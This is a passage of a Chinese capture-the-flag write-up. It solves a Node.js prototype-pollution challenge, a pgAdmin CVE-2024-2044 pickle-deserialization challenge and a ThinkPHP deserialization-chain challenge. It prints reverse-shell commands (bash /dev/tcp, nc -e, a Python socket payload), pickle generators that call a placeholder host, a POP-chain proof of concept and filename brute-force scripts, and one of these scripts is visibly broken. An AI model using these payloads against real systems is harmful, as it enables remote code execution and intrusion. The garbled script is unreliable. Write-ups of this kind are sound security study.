class="line"><span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">cc.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">data</span> = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;./hack&quot;</span>,<span class="string">&quot;exports&quot;</span>: </span><br><span class="line"><span class="string">&quot;./shell.js&quot;</span>&#125;;</span><br><span class="line">cc.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">path</span> = <span class="string">&quot;/app&quot;</span>;</span><br><span class="line">cc.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">command</span> = <span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/</span></span><br><span class="line"><span class="string">tcp/vps/port 0&gt;&amp;1&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>也是反弹shell</p><p>同样读&#x2F;readflag 即可</p><p><img src="https://bu.dusays.com/2024/05/15/66441db78d510.png" alt="image-20240325213743878"></p><h2 id="attack-tacoooooooo"><a href="#attack-tacoooooooo" class="headerlink" title="attack_tacoooooooo"></a>attack_tacoooooooo</h2><p>这道题也是有思路吧</p><p>题目描述：</p><p><img src="https://bu.dusays.com/2024/05/15/66441db667191.png" alt="image-20240325214022039"></p><p>进入容器</p><p><img src="https://bu.dusays.com/2024/05/15/66441db856501.png" alt="image-20240325214417999"></p><p>开始时也是发现url上有参数 尝试sql 无果</p><p>回头看题目描述 得到账号：<a href="mailto:&#116;&#x61;&#x63;&#x6f;&#x6f;&#111;&#x6f;&#x6f;&#64;&#x71;&#x71;&#46;&#99;&#111;&#x6d;">&#116;&#x61;&#x63;&#x6f;&#x6f;&#111;&#x6f;&#x6f;&#64;&#x71;&#x71;&#46;&#99;&#111;&#x6d;</a></p><p>然后就产生爆破密码 6000的字典没有爆出 感觉应该不是这样写的</p><p>抓包：</p><p><img src="https://bu.dusays.com/2024/05/15/66441db9aab6e.png" alt="image-20240325214820515"></p><p>传密码123 回显：</p><p><img src="https://bu.dusays.com/2024/05/15/66441db64385d.png" alt="image-20240325215028893"></p><p>密码不对</p><p>然后我发现容器叫：</p><p><img src="https://bu.dusays.com/2024/05/15/66441db5dc77c.png" alt="image-20240325215113200"></p><p>所以尝试密码为pgAdmin4</p><p>回显：</p><p><img src="https://bu.dusays.com/2024/05/15/66441db5df72e.png" alt="image-20240325215209147"></p><p>到这里我感觉其实密码就是pgAdmin4</p><p>结合抓包结果</p><p>cookie中有 pga4_session</p><p>post传参有： csrf_token</p><p>再结合研究这道题后 查找出资料发现 这道题可能是：CVE-2024 2044</p><p>CVE-2024 2044的漏洞复现：</p><p><img src="https://bu.dusays.com/2024/05/15/66441db9b7725.png" alt="image-20240325215735767"></p><p>也有pga4_session 极有可能是 </p><p>最后发现CVE-2024 2044其实跟pickle反序列化有关 </p><p>再结合我输入pgAdmin4的回显 </p><p>至此 我认为我的思路清晰了 通过pickle反序列化将cookie覆盖 然后登录进入</p><p>但是 我根本不知道要将cookie覆盖成什么 卡死在这里</p><p>看完wp后发现其实可以直接登录进入</p><p>密码是tacooooo  <strong>怎么说呢 回显误我QAQ</strong></p><p>进入：<br><img src="https://bu.dusays.com/2024/05/15/66441db83beef.png" alt="image-20240325221234776"></p><p>然后呢</p><p>请看此[文章](<a href="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/">屏蔽器 - pgAdmin （&lt;&#x3D;8.3） 会话处理中的路径遍历会导致不安全的反序列化和远程代码执行 （RCE） (shielder.com)</a>)</p><p>反正我在国内没找到有用的CVE-2024 2044的文章</p><p>所以CVE-2024 2044与pickle反序列化的思路是没问题的</p><p>根据文章复现漏洞即可</p><p>linux:</p><p><img src="https://bu.dusays.com/2024/05/15/66441db8933b3.png" alt="image-20240325224759191"></p><p>posix.pickle文件生成：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">produce_pickle_bytes</span>(<span class="params">platform, cmd</span>):</span><br><span class="line">    b = <span class="string">b&#x27;\x80\x04\x95&#x27;</span></span><br><span class="line">    b += struct.pack(<span class="string">&#x27;L&#x27;</span>, <span class="number">22</span> + <span class="built_in">len</span>(platform) + <span class="built_in">len</span>(cmd))</span><br><span class="line">    b += <span class="string">b&#x27;\x8c&#x27;</span> + struct.pack(<span class="string">&#x27;b&#x27;</span>, <span class="built_in">len</span>(platform)) + platform.encode()</span><br><span class="line">    b += <span class="string">b&#x27;\x94\x8c\x06system\x94\x93\x94&#x27;</span></span><br><span class="line">    b += <span class="string">b&#x27;\x8c&#x27;</span> + struct.pack(<span class="string">&#x27;b&#x27;</span>, <span class="built_in">len</span>(cmd)) + cmd.encode()</span><br><span class="line">    b += <span class="string">b&#x27;\x94\x85\x94R\x94.&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(b)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        exit(<span class="string">f&quot;usage: <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> ip:port&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;nt.pickle&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(produce_pickle_bytes(<span class="string">&#x27;nt&#x27;</span>, <span class="string">f&quot;mshta.exe http://<span class="subst">&#123;HOST&#125;</span>/&quot;</span>))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;posix.pickle&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(produce_pickle_bytes(<span class="string">&#x27;posix&#x27;</span>, <span class="string">f&quot;curl http://<span class="subst">&#123;HOST&#125;</span>/&quot;</span>))</span><br></pre></td></tr></table></figure><p>创建两个序列化对象，一个用于 Windows（），一个用于 Linux&#x2F;POSIX（），它们将在反序列化时执行 HTTP 请求</p><p>所以要稍微改一下 生成文件的脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">produce_pickle_bytes</span>(<span class="params">platform, cmd</span>):</span><br><span class="line">    b = <span class="string">b&#x27;\x80\x04\x95&#x27;</span></span><br><span class="line">    b += struct.pack(<span class="string">&#x27;L&#x27;</span>, <span class="number">22</span> + <span class="built_in">len</span>(platform) + <span class="built_in">len</span>(cmd))</span><br><span class="line">    b += <span class="string">b&#x27;\x8c&#x27;</span> + struct.pack(<span class="string">&#x27;b&#x27;</span>, <span class="built_in">len</span>(platform)) + platform.encode()</span><br><span class="line">    b += <span class="string">b&#x27;\x94\x8c\x06system\x94\x93\x94&#x27;</span></span><br><span class="line">    b += <span class="string">b&#x27;\x8c&#x27;</span> + struct.pack(<span class="string">&#x27;b&#x27;</span>, <span class="built_in">len</span>(cmd)) + cmd.encode()</span><br><span class="line">    b += <span class="string">b&#x27;\x94\x85\x94R\x94.&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(b)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;posix.pickle&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(produce_pickle_bytes(<span class="string">&#x27;posix&#x27;</span>, <span class="string">f&quot;nc ip port -e /bin/sh&quot;</span>))</span><br></pre></td></tr></table></figure><p>根据上文</p><p>接下来就是上传文件 然后改cookie和替换pga4_session</p><blockquote><p>将 cookie 值更改为替换为当前登录用户的电子邮件，</p><p>然后替换为<code>pga4_session../storage/&lt;email&gt;/posix.pickle!a&lt;email&gt;@_</code></p></blockquote><p>并且我们的cookie路径是绝对路径而不是相对的   &#x2F;var&#x2F;lib&#x2F;pgadmin&#x2F;storage&#x2F;tacooooo_qq.com&#x2F;posix.pickle!a</p><p>所以现在我们需要找到一个可以上传文件的地方</p><p><img src="https://bu.dusays.com/2024/05/15/66441dbb3e5f1.png" alt="image-20240326000715537"></p><p>最后在这里面找到文件上传系统</p><p><img src="https://bu.dusays.com/2024/05/15/66441db712a7d.png" alt="image-20240326001309065"></p><p>运行 </p><p><img src="https://bu.dusays.com/2024/05/15/66441dbbee4be.png" alt="image-20240326001953198"></p><p>其实是生成一段Pickle反序列化后的代码 这里是没加ip的</p><p>记得要加Ip和端口</p><p>所以直接来也是一样的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>, (<span class="string">&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;ip\&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    c = exp()</span><br><span class="line">    payload = pickle.dumps(c)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;posix.pickle&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(payload)</span><br></pre></td></tr></table></figure><p>上传文件posix.pickle</p><p><img src="https://bu.dusays.com/2024/05/15/66441db7621b0.png" alt="image-20240326002549806"></p><p>然后随便抓包改cookie</p><p>再反弹shell即可</p><p><img src="https://bu.dusays.com/2024/05/15/66441db7494d8.png" alt="image-20240326004459228"></p><h2 id="用过就是熟悉"><a href="#用过就是熟悉" class="headerlink" title="用过就是熟悉"></a>用过就是熟悉</h2><p>这个是完全没思路 审了半天源码 其实感觉是反序列化 但是代码太多了 没找到链子</p><p><strong>think反序列化</strong></p><p>题目：</p><p><img src="https://bu.dusays.com/2024/05/15/66441db7391bc.png" alt="image-20240326005418505"></p><p>进来是个登录界面</p><p><img src="https://bu.dusays.com/2024/05/15/66441db9a67fb.png" alt="image-20240326005453711"></p><p>给了源码</p><p>简单看下源码其实就能发现有一些魔术方法 这也是我为什么猜测有反序列化漏洞的原因</p><p>所以直接搜unserialize</p><p>thelover3\files\app\controller\user\think\Template.php中有unserialize</p><p><img src="https://bu.dusays.com/2024/05/15/66441db8adc26.png" alt="image-20240326012724127"></p><p>thelover3\files\app\controller\user\think\Testone.php</p><p><img src="https://bu.dusays.com/2024/05/15/66441db76b944.png" alt="image-20240326012853029"></p><p>thelover3\files\app\controller\user\index.class.php</p><p><img src="https://bu.dusays.com/2024/05/15/66441db84fbb9.png" alt="image-20240326013324096"></p><p>这个还有提示 不出意外的话就是这个了 保险起见 继续找下</p><p>thelover3\files\app\api\KodSSO.class.php</p><p><img src="https://bu.dusays.com/2024/05/15/66441db89a247.png" alt="image-20240326013917710"></p><p>thelover3\files\app\function\common.function.php</p><p><img src="https://bu.dusays.com/2024/05/15/66441db7e0ba2.png" alt="image-20240326014024928"></p><p>差不多了 </p><p>其实就是第三个 </p><p>给了hint ：tp-&gt;thinkphp</p><p>所以是thinkphp反序列化 且这里是是链子的开头</p><p>接下来就是用一样的方法找<code>__destruct</code>方法和<code>__wakeup</code></p><p><strong>__destruct:</strong></p><p>thelover3\files\app\controller\user\think\process\pipes\Windows.php</p><p><img src="https://bu.dusays.com/2024/05/15/66441db73c709.png" alt="image-20240326015142272"></p><p>thelover3\files\app\controller\user\think\Process.php</p><p><img src="https://bu.dusays.com/2024/05/15/66441db6689b1.png" alt="image-20240326015250578"></p><p>thelover3\files\app\controller\user\think\process\pipes\Unix.php</p><p><img src="https://bu.dusays.com/2024/05/15/66441db76457b.png" alt="image-20240326015353427"></p><p>只有三个</p><p>根据代码 第一个是链子的可能新最高</p><p><strong>__wakeup:</strong></p><p>thelover3\files\app\controller\user\think\process\pipes\Windows.php</p><p><img src="https://bu.dusays.com/2024/05/15/66441db6889f2.png" alt="image-20240326015646878"></p><p>D:\流量\thelover3\files\app\controller\user\think\process\pipes\Pipes.php</p><p><img src="https://bu.dusays.com/2024/05/15/66441db6d4708.png" alt="image-20240326015717657"></p><p>只有两个 并且这两个都没什么用</p><p>所以第一个__destruct应该有链子</p><p>查找资料后发现：</p><p>和<a href="https://www.freebuf.com/articles/web/284091.html">tp5.0.24</a>很像</p><p>根据文章继续跟进</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">removeFiles</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进close():</p><p><img src="https://bu.dusays.com/2024/05/15/66441db798f42.png" alt="image-20240326020947054"></p><p>close为关闭文件的方法，没有利用点</p><p>跟进removeFiles()：</p><p><img src="https://bu.dusays.com/2024/05/15/66441db838d2f.png" alt="image-20240326021123398"></p><p>此处对 <code>$result </code>进行了赋值，其中包含字段<code>$filename</code>是可控的，所以可以触发 toString 魔术方法</p><p>根本没想到这里QAQ</p><p>又是一处思维误区 习惯性的在Windows.php中找 没有 最后在Collection.php中找到</p><p><img src="https://bu.dusays.com/2024/05/15/66441db72c1f4.png" alt="image-20240326021644991"></p><p>这里可以继续跟进toJson() 太难找了</p><p>thelover3\files\app\controller\user\think\Collection.php</p><p>在Collection.php里面的话为什么我最开始没找到QAQ</p><p><img src="https://bu.dusays.com/2024/05/15/66441db792157.png" alt="image-20240326024642098"></p><p>一样在Collection.php继续跟进toArray()</p><p><img src="https://bu.dusays.com/2024/05/15/66441db78ea5b.png" alt="image-20240326024913038"></p><p>这里的$items也是可控的，所以可以触发__get 魔术方法 访问不存在的属性</p><p>而在上文提到的文章中发现他的toArray()很长</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ........</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$relation</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$name</span>, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$relation</span>)) &#123;</span><br><span class="line">                        <span class="variable">$modelRelation</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$relation</span>();</span><br><span class="line">                        <span class="variable">$value</span>         = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationData</span>(<span class="variable">$modelRelation</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getBindAttr&#x27;</span>)) &#123;</span><br><span class="line">                            <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getBindAttr</span>();</span><br><span class="line">                            <span class="keyword">if</span> (<span class="variable">$bindAttr</span>) &#123;</span><br><span class="line">                                <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$attr</span>) &#123;</span><br><span class="line">                                    <span class="variable">$key</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>) ? <span class="variable">$attr</span> : <span class="variable">$key</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bind attr has exists:&#x27;</span> . <span class="variable">$key</span>);</span><br><span class="line">                                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                        <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$item</span>) ? <span class="variable">$item</span> : [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里其实是在触发__call方法</p><p>所以我们这里也要想办法触发__call方法</p><p>找到__get</p><p>thelover3\files\app\controller\user\think\View.php</p><p><img src="https://bu.dusays.com/2024/05/15/66441db8ab9c5.png" alt="image-20240326030040471"></p><p>$data 参数也是可控的，接着我们就能调用__call方法</p><p>但是其实是有两个__call方法 如下:</p><p>thelover3\files\app\controller\user\think\Config.php  这个可以包含文件</p><p><img src="https://bu.dusays.com/2024/05/15/66441db8b27ca.png" alt="image-20240326030301317"></p><p>thelover3\files\app\controller\user\think\Testone.php  这个可以写文件</p><p><img src="https://bu.dusays.com/2024/05/15/66441db91d949.png" alt="image-20240326030409253"></p><p>第二个__call：我们的content 写进去的内容来自于hint.php 我们跟进</p><p>hinthinthinthinthinthinthint.php：</p><p><img src="https://bu.dusays.com/2024/05/15/66441db7a68f4.png" alt="image-20240326030755478"></p><p>说明我们的content里面有提示，所以我们的思路就是首先走写文件的__call,然后读hint 直接放poc了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Collection</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Collection</span>()];<span class="comment">//触发Model __toString(),子类Pivot合适</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Collection</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$items</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;items=<span class="keyword">new</span> <span class="title class_">View</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Testone</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Debug</span> <span class="keyword">extends</span> <span class="title">Testone</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$engine</span>=<span class="keyword">array</span>(<span class="string">&quot;time&quot;</span>=&gt;<span class="string">&quot;10086&quot;</span>);</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="string">&#x27;Loginout&#x27;</span>]=<span class="keyword">new</span> <span class="title class_">Debug</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure><p>注意生成文件名的逻辑：</p><p>md5(time())</p><p>所以我们可以根据本地预测时间的方式执行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">time</span>()+<span class="number">6</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>然后执行这个脚本后 马上重复发包（生成hint的包），连发六秒，保险起见 也可以多发几秒，这样总有一个是我们的生成的文件名</p><p>其实可以直接写时间md5竞争上传脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">t = <span class="number">1711177055</span></span><br><span class="line">url = <span class="string">&quot;http://119b2b2c-d2c8-491a-a211-886d4261cdb8.node.nkctf.yuzhian.com.cn/app/controller/user/think/&quot;</span></span><br><span class="line"><span class="comment"># 遍历列表中的每个数字</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    t = t + <span class="number">1</span></span><br><span class="line">    number_str = <span class="built_in">str</span>(t).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    hash_object = hashlib.md5(number_str)</span><br><span class="line">    md5_hash = hash_object.hexdigest()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    res = requests.get(url=url+md5_hash)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;md5_hash&#125;</span> : f<span class="subst">&#123;<span class="built_in">len</span>(res.text)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>&#x2F;app&#x2F;controller&#x2F;user&#x2F;think&#x2F;md5 下载到hint</p><p>也可以直接爆破文件名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://192.168.146.131:3101/?user/index/loginSubmit&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">     <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;guest&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM</span></span><br><span class="line"><span class="string">0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE2Oi</span></span><br><span class="line"><span class="string">J0aGlua1xDb2xsZWN0aW9uIjoxOntzOjg6IgAqAGl0ZW1zIjtPOjEwOiJ0aGlua1xWaWV3I</span></span><br><span class="line"><span class="string">joyOntzOjc6IgAqAGRhdGEiO2E6MTp7czo4OiJMb2dpbm91dCI7TzoxMToidGhpbmtcRGVi</span></span><br><span class="line"><span class="string">dWciOjA6e319czo2OiJlbmdpbmUiO2E6Mjp7czo0OiJ0aW1lIjtzOjU6IjEwMDg2IjtzOjQ</span></span><br><span class="line"><span class="string">6Im5hbWUiO3M6MTY6ImRhdGEvZmlsZXMvc2hlbGwiO319fX19&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rememberPassword&#x27;</span>:<span class="string">&#x27;0&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;salt&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;CSRF_TOKEN&#x27;</span>:<span class="string">&#x27;4jxeh3K4CNEettFi&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;API_ROUTE&#x27;</span>:<span class="string">&#x27;user/index/loginSubmit&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url=url,data=data)</span><br><span class="line">time = <span class="built_in">int</span>(time.time())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(time-,time+<span class="number">50</span>):</span><br><span class="line">md5_hash = hashlib.md5(<span class="built_in">str</span>(i).encode()).hexdigest()</span><br><span class="line">url2 = <span class="string">&#x27;http://192.168.146.131:3101/app/controller/user/think/&#x27;</span> + s</span><br><span class="line">tr(md5_hash)</span><br><span class="line">res = requests.get(url2)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;可道&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line"><span class="built_in">print</span>(md5_hash)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>hint:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">亲爱的Chu0，</span><br><span class="line"> </span><br><span class="line">我怀着一颗激动而充满温柔的心，写下这封情书，希望它能够传达我对你的深深情感。或许这只是一封文字，但我希望每一个字都能如我心情般真挚。</span><br><span class="line"> </span><br><span class="line">在这个瞬息万变的世界里，你是我生命中最美丽的恒定。每一天，我都被你那灿烂的笑容和温暖的眼神所吸引，仿佛整个世界都因为有了你而变得更加美好。你的存在如同清晨第一缕阳光，温暖而宁静。</span><br><span class="line"> </span><br><span class="line">或许，我们之间存在一种特殊的联系，一种只有我们两个能够理解的默契。</span><br><span 